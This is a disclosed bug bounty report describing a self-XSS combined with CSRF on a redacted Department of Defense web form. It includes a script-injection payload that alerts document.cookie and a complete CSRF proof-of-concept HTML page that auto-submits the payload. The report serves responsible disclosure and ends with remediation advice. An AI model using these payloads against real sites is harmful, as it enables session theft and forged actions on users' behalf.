# Self XSS + CSRF Leads to Reflected XSS in https://████/ 

## Report Details
- **Report ID**: 1109544
- **URL**: https://hackerone.com/reports/1109544
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-23T13:29:56.467Z
- **Disclosed**: 2021-03-24T20:50:49.857Z

## Reporter
- **Username**: sleepnotf0und
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi Security Team,
The form inputs in https://███/ Vulnerable to Self XSS 
Either the form was vulnerable to CSRF 

When these two bugs available and attacker could combine them to Perform a Reflected XSS Attack

## Impact

Reflected XSS
Execute JS Code in behave of a user

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Visit https://███████/
2 - type the payload in the "First Name" input ```test";</script><script>alert(document.cookie)</script>```
3 - Fill all input then submit the form 
4 - Notice the XSS popup
5 - Exploit the CSRF to Perform Reflected XSS attack by this Code:-
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://██████████/" method="POST">
      <input type="hidden" name="title" value="es" />
      <input type="hidden" name="first&#95;name" value="test";</script><script>alert(document.cookie)</script>" />
      <input type="hidden" name="middle&#95;name" value="test" />
      <input type="hidden" name="last&#95;name" value="test" />
      <input type="hidden" name="suffix" value="II" />
      <input type="hidden" name="sex" value="M" />
      <input type="hidden" name="██████&#95;█████" value="█████" />
      <input type="hidden" name="████████&#95;███████&#95;number" value="21365" />
      <input type="hidden" name="address&#95;1" value="test" />
      <input type="hidden" name="address&#95;2" value="test" />
      <input type="hidden" name="city" value="test" />
      <input type="hidden" name="state" value="ID" />
      <input type="hidden" name="zip&#95;code" value="53228" />
      <input type="hidden" name="country&#95;code" value="" />
      <input type="hidden" name="completion&#95;date" value="2&#47;23&#47;2021" />
      <input type="hidden" name="comments" value="test" />
      <input type="hidden" name="mail&#95;to&#95;first&#95;name" value="test&quot;&#59;&lt;&#47;script&gt;&lt;script&gt;alert&#40;&quot;HACKED&#32;BY&#32;Sleep&#32;NOt&#32;Found&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="mail&#95;to&#95;middle&#95;name" value="test" />
      <input type="hidden" name="mail&#95;to&#95;last&#95;name" value="test" />
      <input type="hidden" name="mail&#95;to&#95;suffix" value="II" />
      <input type="hidden" name="mail&#95;to&#95;address&#95;1" value="test" />
      <input type="hidden" name="mail&#95;to&#95;address&#95;2" value="test" />
      <input type="hidden" name="mail&#95;to&#95;city" value="test" />
      <input type="hidden" name="mail&#95;to&#95;state" value="ID" />
      <input type="hidden" name="mail&#95;to&#95;zip&#95;code" value="53228" />
      <input type="hidden" name="mail&#95;to&#95;country&#95;code" value="" />
      <input type="hidden" name="mail&#95;to&#95;email" value="lind&#46;regan4046&#64;yousmail&#46;com" />
      <input type="hidden" name="multiple&#95;submissions" value="true" />
      <input type="hidden" name="uniqueFormId" value="8567588" />
      <input type="hidden" name="action" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html> 
```

## Suggested Mitigation/Remediation Actions
The input Should be sanitized
The Form should be Protected with a CSRF Token



## Attachments
No attachments
